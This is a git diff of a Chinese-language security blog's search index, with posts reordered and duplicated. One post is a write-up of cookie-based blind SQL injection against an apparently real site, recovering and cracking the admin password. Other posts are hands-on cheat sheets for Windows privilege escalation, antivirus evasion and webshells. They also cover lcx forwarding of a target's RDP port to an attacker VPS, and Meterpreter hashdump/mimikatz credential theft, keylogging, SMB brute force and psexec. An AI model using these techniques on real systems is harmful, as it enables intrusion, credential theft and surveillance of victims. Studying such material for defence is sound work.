@@ -1,6 +1,65 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Access数据库的cookie盲注</title>
+    <url>/2020/02/11/Access%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84cookie%E7%9B%B2%E6%B3%A8/</url>
+    <content><![CDATA[<h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><ul>
+<li>网站各敏感信息均已打马</li>
+<li>已将漏洞上报</li>
+<li>内容仅供学习，切勿用于非法行为，否则后果自负</li>
+</ul>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ol>
+<li><p>首先收集信息。简单扫描了一下发现是个IIS+ASP.NET+Access的网站。有一个内网的IP可以访问是登录OA系统的，通过目录枚举找到网站的后台管理页面/admin。</p>
+<ul>
+<li><p>OA页面是这样的</p>
+<p><img src="/2020/02/11/Access%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84cookie%E7%9B%B2%E6%B3%A8/1.png" alt="login"></p>
+</li>
+</ul>
+<p>试了下弱密码，万能密码都不行</p>
+<ul>
+<li><p>然后是后台页面</p>
+<p><img src="/2020/02/11/Access%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84cookie%E7%9B%B2%E6%B3%A8/2.png" alt="adminlogin"></p>
+</li>
+</ul>
+<p>弱密码万能密码，也都不行。这个验证码在前端看了一下，其实提交会传两个，还有个是hidden属性的，里面直接填了验证码的值。那可以试试爆破。发现只要两个验证码的值一样就能通过验证，根本不需要后台的传值。但由于改网站在cookie方面做了防护，会定时更换。爆破一会就会进行安全检查，没办法继续。</p>
+</li>
+<li><p>后台没办法就只能从前端页面找了</p>
+<ul>
+<li><p>瞎逛了一圈，找了几个能传参的地方试注入，结果发现有waf。百度查了一下wts-waf。好像是个很弱鸡的，直接能加号绕过空格。尝试一下and 1=1 and 1=0，发现确实存在注入。但没回显，就很难受。</p>
+<p><img src="/2020/02/11/Access%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84cookie%E7%9B%B2%E6%B3%A8/3.png" alt="page"></p>
+</li>
+</ul>
+<p>好嘛，那只能盲注了。试了一下绕过加盲注，根本不行。括号里的内容再用加号就扑街，没法执行。那咋办。</p>
+<p>没办法，只能用没括号的语句先猜一下表和字段名了。order by测出有13条语句，再联合查询，测出admin表存在，然后修改联合查询，用通配符替换后面的数字，发现admin居然有五个字段。晕了。然后再替换前面的数字为字段名，user，password什么的都试一下，发现全报错。操。那咋办？？</p>
+</li>
+</ol>
+<h1 id="柳暗花明又一村"><a href="#柳暗花明又一村" class="headerlink" title="柳暗花明又一村"></a>柳暗花明又一村</h1><ol>
+<li>经过我不懈努力，各种查资料，发现可以尝试从登录页面的前端入手，name属性的值很有可能和字段名一致。去看了看前端的源码。</li>
+</ol>
+<p><img src="/2020/02/11/Access%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84cookie%E7%9B%B2%E6%B3%A8/4.png" alt="source"></p>
+<p>​    试了一下，居然成了？？好吧，表和字段都有了，但是没回显，普通盲注又不行，咋办。</p>
+<ol start="2">
+<li><p>又是一通瞎几把找资料，发现Access还可能出现cookie注入。简单来说就是后端接收变量不明确，可能把cookie内的值也当做数据库查询的值代入查询了。这种方法可以用来绕过一般的waf。试了一下，在cookie里加入id=xxx这样的值，然后把url后面的?id=xxx去掉，可以正常访问。说明存在cookie注入。那现在就需要把盲注的语句放到cookie里就行了！</p>
+</li>
+<li><p>盲注就不多说了，资料都有。大概就是这样</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;xxx and(select top 1 len(admin_name) from admin)&gt;5</span><br><span class="line">?id&#x3D;xxx and(select top 1 asc(mid(admin_name,1,1)) from admin)&gt;100</span><br></pre></td></tr></table></figure>
+
+<p>先判断字段长度，然后逐字猜解。用户名5位，admin，很容易就搞出来了，密码16位有点长，这里就推荐用burp爆破，修改cookie里的值，看返回的数据包长度判断执行结果，这里不多赘述。</p>
+<p>最后得出来的ASCII码值对照表翻译一下得到一串密文。目测16位的md5加密</p>
+<p>最后扔到cmd5解密一下就出来了。登录进去</p>
+</li>
+</ol>
+<p><img src="/2020/02/11/Access%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84cookie%E7%9B%B2%E6%B3%A8/5.png" alt="admin"></p>
+<p>图片管理处可以上传图片，不知道能不能传个马什么的进一步提权，到这里就不再深入了，毕竟是学习为主。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li>一杯茶，一包烟，一个破站日一天，真的没错。这一个小破站就花了我几天的时间去研究。不过通过搜索资料还是很有收获的。学习了很多思路和技巧。</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>渗透实战</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTTP Header 注入</title>
     <url>/2020/02/17/HTTP-Header-%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h1 id="可注入参数"><a href="#可注入参数" class="headerlink" title="可注入参数"></a>可注入参数</h1><ul>
@@ -260,347 +319,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Access数据库的cookie盲注</title>
-    <url>/2020/02/11/Access%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84cookie%E7%9B%B2%E6%B3%A8/</url>
-    <content><![CDATA[<h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><ul>
-<li>网站各敏感信息均已打马</li>
-<li>已将漏洞上报</li>
-<li>内容仅供学习，切勿用于非法行为，否则后果自负</li>
-</ul>
-<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ol>
-<li><p>首先收集信息。简单扫描了一下发现是个IIS+ASP.NET+Access的网站。有一个内网的IP可以访问是登录OA系统的，通过目录枚举找到网站的后台管理页面/admin。</p>
-<ul>
-<li><p>OA页面是这样的</p>
-<p><img src="/2020/02/11/Access%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84cookie%E7%9B%B2%E6%B3%A8/1.png" alt="login"></p>
-</li>
-</ul>
-<p>试了下弱密码，万能密码都不行</p>
-<ul>
-<li><p>然后是后台页面</p>
-<p><img src="/2020/02/11/Access%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84cookie%E7%9B%B2%E6%B3%A8/2.png" alt="adminlogin"></p>
-</li>
-</ul>
-<p>弱密码万能密码，也都不行。这个验证码在前端看了一下，其实提交会传两个，还有个是hidden属性的，里面直接填了验证码的值。那可以试试爆破。发现只要两个验证码的值一样就能通过验证，根本不需要后台的传值。但由于改网站在cookie方面做了防护，会定时更换。爆破一会就会进行安全检查，没办法继续。</p>
-</li>
-<li><p>后台没办法就只能从前端页面找了</p>
-<ul>
-<li><p>瞎逛了一圈，找了几个能传参的地方试注入，结果发现有waf。百度查了一下wts-waf。好像是个很弱鸡的，直接能加号绕过空格。尝试一下and 1=1 and 1=0，发现确实存在注入。但没回显，就很难受。</p>
-<p><img src="/2020/02/11/Access%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84cookie%E7%9B%B2%E6%B3%A8/3.png" alt="page"></p>
-</li>
-</ul>
-<p>好嘛，那只能盲注了。试了一下绕过加盲注，根本不行。括号里的内容再用加号就扑街，没法执行。那咋办。</p>
-<p>没办法，只能用没括号的语句先猜一下表和字段名了。order by测出有13条语句，再联合查询，测出admin表存在，然后修改联合查询，用通配符替换后面的数字，发现admin居然有五个字段。晕了。然后再替换前面的数字为字段名，user，password什么的都试一下，发现全报错。操。那咋办？？</p>
-</li>
-</ol>
-<h1 id="柳暗花明又一村"><a href="#柳暗花明又一村" class="headerlink" title="柳暗花明又一村"></a>柳暗花明又一村</h1><ol>
-<li>经过我不懈努力，各种查资料，发现可以尝试从登录页面的前端入手，name属性的值很有可能和字段名一致。去看了看前端的源码。</li>
-</ol>
-<p><img src="/2020/02/11/Access%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84cookie%E7%9B%B2%E6%B3%A8/4.png" alt="source"></p>
-<p>​    试了一下，居然成了？？好吧，表和字段都有了，但是没回显，普通盲注又不行，咋办。</p>
-<ol start="2">
-<li><p>又是一通瞎几把找资料，发现Access还可能出现cookie注入。简单来说就是后端接收变量不明确，可能把cookie内的值也当做数据库查询的值代入查询了。这种方法可以用来绕过一般的waf。试了一下，在cookie里加入id=xxx这样的值，然后把url后面的?id=xxx去掉，可以正常访问。说明存在cookie注入。那现在就需要把盲注的语句放到cookie里就行了！</p>
-</li>
-<li><p>盲注就不多说了，资料都有。大概就是这样</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;xxx and(select top 1 len(admin_name) from admin)&gt;5</span><br><span class="line">?id&#x3D;xxx and(select top 1 asc(mid(admin_name,1,1)) from admin)&gt;100</span><br></pre></td></tr></table></figure>
-
-<p>先判断字段长度，然后逐字猜解。用户名5位，admin，很容易就搞出来了，密码16位有点长，这里就推荐用burp爆破，修改cookie里的值，看返回的数据包长度判断执行结果，这里不多赘述。</p>
-<p>最后得出来的ASCII码值对照表翻译一下得到一串密文。目测16位的md5加密</p>
-<p>最后扔到cmd5解密一下就出来了。登录进去</p>
-</li>
-</ol>
-<p><img src="/2020/02/11/Access%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84cookie%E7%9B%B2%E6%B3%A8/5.png" alt="admin"></p>
-<p>图片管理处可以上传图片，不知道能不能传个马什么的进一步提权，到这里就不再深入了，毕竟是学习为主。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
-<li>一杯茶，一包烟，一个破站日一天，真的没错。这一个小破站就花了我几天的时间去研究。不过通过搜索资料还是很有收获的。学习了很多思路和技巧。</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>渗透实战</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>markdown 语法学习</title>
-    <url>/2020/02/10/markdown-%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><p><strong>加粗</strong> <em>倾斜</em>  <strong><em>粗斜体</em></strong>  <del>删除线</del></p>
-<blockquote>
-<p>引用</p>
-<blockquote>
-<p>继续引用</p>
-</blockquote>
-</blockquote>
-<p>分割线</p>
-<hr>
-<p>图片：</p>
-<p><img src="https://i0.hdslb.com/bfs/article/1bc392a3b58e084b35598d5db20ced92a1428ac8.jpg@1320w_1180h.webp" alt="picture" title="乃爱~"></p>
-<p>超链接：</p>
-<p><a href="https://www.baidu.com" target="_blank" rel="noopener">百度，搜索滴神！</a></p>
-<p>无序列表：</p>
-<ul>
-<li>qwerasd</li>
-<li>asdfzxc</li>
-</ul>
-<p>有序列表：</p>
-<ol>
-<li>啊</li>
-<li>啊？</li>
-</ol>
-<p>嵌套列表：</p>
-<ul>
-<li>乌兹！<ul>
-<li>永远滴神！</li>
-</ul>
-</li>
-</ul>
-<ol>
-<li>乌兹！<ol>
-<li>别克斯坦</li>
-</ol>
-</li>
-</ol>
-<p>表格：</p>
-<table>
-<thead>
-<tr>
-<th>id</th>
-<th align="center">name</th>
-<th align="right">password</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td align="center">user</td>
-<td align="right">1234</td>
-</tr>
-</tbody></table>
-<p>代码：</p>
-<p><code>print(&quot;hello&quot;)</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def hello():</span><br><span class="line">	print(&quot;hello&quot;)</span><br><span class="line">hello()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>基础学习</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows提权</title>
-    <url>/2020/02/25/Windows%E6%8F%90%E6%9D%83/</url>
-    <content><![CDATA[<h1 id="提权信息收集"><a href="#提权信息收集" class="headerlink" title="提权信息收集"></a>提权信息收集</h1><ul>
-<li>当前系统版本，使用ver命令</li>
-<li>systeminfo，查看系统比较详细的信息，菜刀使用这条命令可能超时。可以进行重定向操作，systeminfo &gt; systeminfo.txt 执行以后会在网站目录下生成一个文件，查看内容即可。</li>
-<li>开放端口，netstat -ano</li>
-<li>所安装的防护软件<ul>
-<li>net start  查看自启动服务</li>
-<li>tasklist  查看进程列表</li>
-<li>dir /a  “c:\program files (x86)”  安装目录 (注：菜刀中路径有空格要用双引号括起来,不然可能找不到）</li>
-<li>c:\program files  安装目录</li>
-<li>wmic /NAMESPACE:”\\root\CIMV2” PATH Win32_Product get name  列出系统安装了什么程序，比较慢的时候也建议用重定向。</li>
-</ul>
-</li>
-<li>当前系统的补丁程序<ul>
-<li>wmic qfe get hotfixid</li>
-<li>wmic qfe get Caption,Description,HotFixID,InstalledOn</li>
-</ul>
-</li>
-<li>可写可读目录（执行不了cmd命令的时候，自己传一个cmd.exe到可读写目录，在菜刀里setp+cmd路径可以设置用自己上传的cmd执行命令，cmd版本要和目标系统cmd版本相匹配）<ul>
-<li>可读写目录探测脚本</li>
-<li>c:\windows\temp\</li>
-<li>%temp%\</li>
-<li>c:\recycler\</li>
-<li>c:$Recycle.Bin\</li>
-<li>d:$Recycle.Bin</li>
-</ul>
-</li>
-</ul>
-<h1 id="最优提权方法选择"><a href="#最优提权方法选择" class="headerlink" title="最优提权方法选择"></a>最优提权方法选择</h1><h2 id="远程溢出（远程代码执行）"><a href="#远程溢出（远程代码执行）" class="headerlink" title="远程溢出（远程代码执行）"></a>远程溢出（远程代码执行）</h2><p>如果是内网，无法进行，拿到webshell以后需要把端口转发出来进行溢出和远程代码执行。</p>
-<ul>
-<li>ms08067</li>
-<li>ms17010</li>
-<li>CVE-2017-7494（linux）</li>
-</ul>
-<h2 id="服务器文件存放密码"><a href="#服务器文件存放密码" class="headerlink" title="服务器文件存放密码"></a>服务器文件存放密码</h2><h2 id="第三方高权限应用提取"><a href="#第三方高权限应用提取" class="headerlink" title="第三方高权限应用提取"></a>第三方高权限应用提取</h2><ul>
-<li>mysql</li>
-<li>mssql</li>
-<li>oracle</li>
-<li>……</li>
-</ul>
-<h2 id="本地溢出"><a href="#本地溢出" class="headerlink" title="本地溢出"></a>本地溢出</h2><p>有溢出先看能不能溢出</p>
-<h2 id="系统错误配置"><a href="#系统错误配置" class="headerlink" title="系统错误配置"></a>系统错误配置</h2><ul>
-<li>Apache+Windows</li>
-</ul>
-<h2 id="DLL劫持漏洞"><a href="#DLL劫持漏洞" class="headerlink" title="DLL劫持漏洞"></a>DLL劫持漏洞</h2><h1 id="exploit寻找下载"><a href="#exploit寻找下载" class="headerlink" title="exploit寻找下载"></a>exploit寻找下载</h1><p>微软已经公布的漏洞，一般不久就会在GitHub出现Exploit，还有就是关注一些国外的大牛安全研究员，还有可能会出现在国内的安全论坛，更多的是国外安全研究者发布。</p>
-<ul>
-<li><p>github</p>
-</li>
-<li><p>google hacking  :  site:github.com exploit</p>
-</li>
-<li><p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a></p>
-</li>
-<li><p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></p>
-</li>
-<li><p>安全社区，T00ls、quansec。</p>
-</li>
-<li><p>安全门户，freebuf、安全客</p>
-</li>
-<li><p>小密圈。</p>
-</li>
-<li><p>k8</p>
-</li>
-<li><p>metasploit</p>
-<p><code>msf5 &gt; search exploit/windows/local/</code></p>
-</li>
-</ul>
-<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
-<li>确定没有补丁以后，从最新的exp开始到之前的不同版本的exp换着试。</li>
-<li>x86是32位系统，传exe也要传对应的。</li>
-<li>exp上传的目录一般需要读写权限，有的大马可以查看可读写目录，查看补丁安装情况。</li>
-<li>二进制文件可以任意修改后缀</li>
-<li>aspx比asp权限大</li>
-<li>可写可读目录查找</li>
-<li>各种马<ul>
-<li><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></li>
-</ul>
-</li>
-</ul>
-<h1 id="关于免杀"><a href="#关于免杀" class="headerlink" title="关于免杀"></a>关于免杀</h1><ul>
-<li>如果是匹配md5，修改任意特征码，比如bannner信息，再编译就行</li>
-<li>如果是拦截危险行为，只能把exp注入到内存。比较难搞</li>
-</ul>
-<h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><h2 id="常用案例"><a href="#常用案例" class="headerlink" title="常用案例"></a>常用案例</h2><ul>
-<li>连接mysql，把3306转发到VPS上某个端口，然后连接VPS上的端口就行</li>
-<li>3389</li>
-<li>打开端口命令<ul>
-<li>REG ADD “HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server” /vfDenyTSConnections /t REG_DWORD /d 0 /f</li>
-<li>注，在菜刀里执行 双引号要转义才能正确执行，因为用提取工具执行命令，命令也是放在双引号里的。xxx.exe “whoami”</li>
-</ul>
-</li>
-</ul>
-<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul>
-<li>VPS一台</li>
-<li>转发工具<ul>
-<li>LCX <ul>
-<li>在vps上  ./lcx -m 2 -p1 8082 -p2 999将8082端口的数据转发到999端口</li>
-<li>然后在目标服务器上 lcx.exe -slave vps的ip 8082 127.0.0.1 3389</li>
-<li>最好保证vps和目标服务器都是同操作系统，lcx版本相同。</li>
-</ul>
-</li>
-<li>NAT bypass</li>
-</ul>
-</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>msf之meterpreter</title>
-    <url>/2020/03/22/msf%E4%B9%8Bmeterpreter/</url>
-    <content><![CDATA[<h1 id="明文密码和HASH获取"><a href="#明文密码和HASH获取" class="headerlink" title="明文密码和HASH获取"></a>明文密码和HASH获取</h1><ul>
-<li>绕过UAC之后，如果目标已经登录过，没有关机或者没有重启后没有用户登录的话，是可以直接从内存里面获取到机器的明文密码。</li>
-</ul>
-<h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><ul>
-<li>绕过UAC，反弹获得meterpreter以后，首先执行hashdump。</li>
-<li>加载模块，load mimikatz</li>
-<li>执行wdigest，获取明文密码。如果不行，尝试执行kerberos或者msv命令</li>
-</ul>
-<h1 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h1><h2 id="手动迁移"><a href="#手动迁移" class="headerlink" title="手动迁移"></a>手动迁移</h2><ul>
-<li>监听的时候 set exitonsession false，exploit -j -z，反弹的时候就不会退出监听。</li>
-<li>sessions查看会话，sessions+id打开会话。</li>
-<li>使用ps命令列出所有进程，getpid查看当前exp进程pid，一般进程都选择迁移到任务管理器进程。</li>
-<li>执行migrate -N explorer.exe。或migrate -P pid。  迁移完成后原进程会自动退出。高权限可以往低权限迁移，低权限不能往高权限迁。</li>
-</ul>
-<h2 id="上线自动迁移"><a href="#上线自动迁移" class="headerlink" title="上线自动迁移"></a>上线自动迁移</h2><ul>
-<li>执行exploit之前设置 set autorunscript migrate - n explorer.exe</li>
-<li>或者执行set AutoRunScript migrate -f，msf会自动选择一个进程进行迁移</li>
-</ul>
-<h1 id="各类操作"><a href="#各类操作" class="headerlink" title="各类操作"></a>各类操作</h1><h2 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h2><ul>
-<li>keyscan_start</li>
-<li>keyscan_dump</li>
-<li>keyboard_send 对目标机器进行键盘输入</li>
-</ul>
-<h2 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h2><ul>
-<li>screenshot</li>
-</ul>
-<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><ul>
-<li>上传：upload /root/xf.php c:\xf.php</li>
-<li>下载： download c:/xf.php /root/1.php</li>
-<li>cat 文件名 查看文件</li>
-<li>edit c:/xf.php 编辑文件</li>
-<li>cd c: / 切换工作目录</li>
-</ul>
-<h2 id="加载语言终端"><a href="#加载语言终端" class="headerlink" title="加载语言终端"></a>加载语言终端</h2><ul>
-<li>load -l 列出能加载的语言终端</li>
-<li>load powershell。加载</li>
-<li>具体操作在官网看看。</li>
-</ul>
-<h1 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h1><p>##获取网段</p>
-<ul>
-<li>shell  –&gt;  ipconfig</li>
-<li>run get_local_subnets</li>
-<li>route list</li>
-</ul>
-<h2 id="添加路由-1"><a href="#添加路由-1" class="headerlink" title="添加路由"></a>添加路由</h2><p>把自己的机器添加进目标主机路由才能对内网进行操作</p>
-<ul>
-<li>run autoroute -s 192.168.0.0</li>
-<li>backgroup –&gt; route add 192.168.0.0 255.255.255.0 1</li>
-<li>arp扫描 run arp_scanner -r 192.168.0.0/24</li>
-</ul>
-<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><ul>
-<li>search portscan</li>
-<li>use auxiliary/scanner/portscan/syn  （use 5）</li>
-<li>setg rhost 192.168.0.0/24 (setg设置全局参数)</li>
-<li>set threads 20 </li>
-<li>set rhost Interrupt: use the quit</li>
-<li>set ports 445 </li>
-<li>exploit</li>
-</ul>
-<h1 id="SMB密码爆破"><a href="#SMB密码爆破" class="headerlink" title="SMB密码爆破"></a>SMB密码爆破</h1><ul>
-<li>首先扫描开放了445端口的主机</li>
-<li>use auxiliary/scanner/smb/smb_login</li>
-<li>set smbuser administrator   (set USER_FILE /root/user.dic)</li>
-<li>set smbpass admin  (set USERPASS_FILE /root/pass.dic)</li>
-<li>set rhosts file:/root/host.dic</li>
-<li>exploit</li>
-</ul>
-<h1 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h1><ul>
-<li>search psxec</li>
-<li>use auxiliary/admin/smb/psexec_command</li>
-<li>set command whoami</li>
-<li>set rhosts 192.168.0.19</li>
-<li>set smbuser administrator</li>
-<li>set smbpass admin</li>
-<li>exploit</li>
-</ul>
-<h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><ul>
-<li><p>一般应用在无法直接连接某个端口的情况下</p>
-</li>
-<li><p>portfwd add -l 6666 -p 3389 -r 127.0.0.1(也可换成内网其他主机ip)</p>
-<p>将目标机器的3389端口转发到装了msf的vps的6666端口上</p>
-</li>
-<li><p>转发完之后删除  add改成delete</p>
-</li>
-</ul>
-<h1 id="socks代理"><a href="#socks代理" class="headerlink" title="socks代理"></a>socks代理</h1><ul>
-<li>不支持ICMP和ARP协议。</li>
-<li>socks5比socks4a支持的协议更多</li>
-</ul>
-<h2 id="具体操作-1"><a href="#具体操作-1" class="headerlink" title="具体操作"></a>具体操作</h2><ul>
-<li>首先添加路由关联到session上</li>
-<li>search socks</li>
-<li>use auxiliary/server/socks4a</li>
-<li>set STVHOST 127.0.0.1</li>
-<li>set SRVPOST  10808</li>
-<li>exploit</li>
-<li>架设完socks代理以后，使用代理需要结合proxychains</li>
-<li>打开proxychains配置文件把端口改成刚才设置的</li>
-<li>proxychains nmap -Pn -sT 192.168.0.19</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>msf</tag>
-        <tag>meterpreter</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SRC实战</title>
     <url>/2020/03/06/SRC%E5%AE%9E%E6%88%98/</url>
     <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="旁站、C段"><a href="#旁站、C段" class="headerlink" title="旁站、C段"></a>旁站、C段</h2><ul>
@@ -849,6 +567,489 @@
       </tags>
   </entry>
   <entry>
+    <title>Windows提权</title>
+    <url>/2020/02/25/Windows%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<h1 id="提权信息收集"><a href="#提权信息收集" class="headerlink" title="提权信息收集"></a>提权信息收集</h1><ul>
+<li>当前系统版本，使用ver命令</li>
+<li>systeminfo，查看系统比较详细的信息，菜刀使用这条命令可能超时。可以进行重定向操作，systeminfo &gt; systeminfo.txt 执行以后会在网站目录下生成一个文件，查看内容即可。</li>
+<li>开放端口，netstat -ano</li>
+<li>所安装的防护软件<ul>
+<li>net start  查看自启动服务</li>
+<li>tasklist  查看进程列表</li>
+<li>dir /a  “c:\program files (x86)”  安装目录 (注：菜刀中路径有空格要用双引号括起来,不然可能找不到）</li>
+<li>c:\program files  安装目录</li>
+<li>wmic /NAMESPACE:”\\root\CIMV2” PATH Win32_Product get name  列出系统安装了什么程序，比较慢的时候也建议用重定向。</li>
+</ul>
+</li>
+<li>当前系统的补丁程序<ul>
+<li>wmic qfe get hotfixid</li>
+<li>wmic qfe get Caption,Description,HotFixID,InstalledOn</li>
+</ul>
+</li>
+<li>可写可读目录（执行不了cmd命令的时候，自己传一个cmd.exe到可读写目录，在菜刀里setp+cmd路径可以设置用自己上传的cmd执行命令，cmd版本要和目标系统cmd版本相匹配）<ul>
+<li>可读写目录探测脚本</li>
+<li>c:\windows\temp\</li>
+<li>%temp%\</li>
+<li>c:\recycler\</li>
+<li>c:$Recycle.Bin\</li>
+<li>d:$Recycle.Bin</li>
+</ul>
+</li>
+</ul>
+<h1 id="最优提权方法选择"><a href="#最优提权方法选择" class="headerlink" title="最优提权方法选择"></a>最优提权方法选择</h1><h2 id="远程溢出（远程代码执行）"><a href="#远程溢出（远程代码执行）" class="headerlink" title="远程溢出（远程代码执行）"></a>远程溢出（远程代码执行）</h2><p>如果是内网，无法进行，拿到webshell以后需要把端口转发出来进行溢出和远程代码执行。</p>
+<ul>
+<li>ms08067</li>
+<li>ms17010</li>
+<li>CVE-2017-7494（linux）</li>
+</ul>
+<h2 id="服务器文件存放密码"><a href="#服务器文件存放密码" class="headerlink" title="服务器文件存放密码"></a>服务器文件存放密码</h2><h2 id="第三方高权限应用提取"><a href="#第三方高权限应用提取" class="headerlink" title="第三方高权限应用提取"></a>第三方高权限应用提取</h2><ul>
+<li>mysql</li>
+<li>mssql</li>
+<li>oracle</li>
+<li>……</li>
+</ul>
+<h2 id="本地溢出"><a href="#本地溢出" class="headerlink" title="本地溢出"></a>本地溢出</h2><p>有溢出先看能不能溢出</p>
+<h2 id="系统错误配置"><a href="#系统错误配置" class="headerlink" title="系统错误配置"></a>系统错误配置</h2><ul>
+<li>Apache+Windows</li>
+</ul>
+<h2 id="DLL劫持漏洞"><a href="#DLL劫持漏洞" class="headerlink" title="DLL劫持漏洞"></a>DLL劫持漏洞</h2><h1 id="exploit寻找下载"><a href="#exploit寻找下载" class="headerlink" title="exploit寻找下载"></a>exploit寻找下载</h1><p>微软已经公布的漏洞，一般不久就会在GitHub出现Exploit，还有就是关注一些国外的大牛安全研究员，还有可能会出现在国内的安全论坛，更多的是国外安全研究者发布。</p>
+<ul>
+<li><p>github</p>
+</li>
+<li><p>google hacking  :  site:github.com exploit</p>
+</li>
+<li><p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a></p>
+</li>
+<li><p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></p>
+</li>
+<li><p>安全社区，T00ls、quansec。</p>
+</li>
+<li><p>安全门户，freebuf、安全客</p>
+</li>
+<li><p>小密圈。</p>
+</li>
+<li><p>k8</p>
+</li>
+<li><p>metasploit</p>
+<p><code>msf5 &gt; search exploit/windows/local/</code></p>
+</li>
+</ul>
+<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
+<li>确定没有补丁以后，从最新的exp开始到之前的不同版本的exp换着试。</li>
+<li>x86是32位系统，传exe也要传对应的。</li>
+<li>exp上传的目录一般需要读写权限，有的大马可以查看可读写目录，查看补丁安装情况。</li>
+<li>二进制文件可以任意修改后缀</li>
+<li>aspx比asp权限大</li>
+<li>可写可读目录查找</li>
+<li>各种马<ul>
+<li><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></li>
+</ul>
+</li>
+</ul>
+<h1 id="关于免杀"><a href="#关于免杀" class="headerlink" title="关于免杀"></a>关于免杀</h1><ul>
+<li>如果是匹配md5，修改任意特征码，比如bannner信息，再编译就行</li>
+<li>如果是拦截危险行为，只能把exp注入到内存。比较难搞</li>
+</ul>
+<h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><h2 id="常用案例"><a href="#常用案例" class="headerlink" title="常用案例"></a>常用案例</h2><ul>
+<li>连接mysql，把3306转发到VPS上某个端口，然后连接VPS上的端口就行</li>
+<li>3389</li>
+<li>打开端口命令<ul>
+<li>REG ADD “HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server” /vfDenyTSConnections /t REG_DWORD /d 0 /f</li>
+<li>注，在菜刀里执行 双引号要转义才能正确执行，因为用提取工具执行命令，命令也是放在双引号里的。xxx.exe “whoami”</li>
+</ul>
+</li>
+</ul>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul>
+<li>VPS一台</li>
+<li>转发工具<ul>
+<li>LCX <ul>
+<li>在vps上  ./lcx -m 2 -p1 8082 -p2 999将8082端口的数据转发到999端口</li>
+<li>然后在目标服务器上 lcx.exe -slave vps的ip 8082 127.0.0.1 3389</li>
+<li>最好保证vps和目标服务器都是同操作系统，lcx版本相同。</li>
+</ul>
+</li>
+<li>NAT bypass</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <tags>
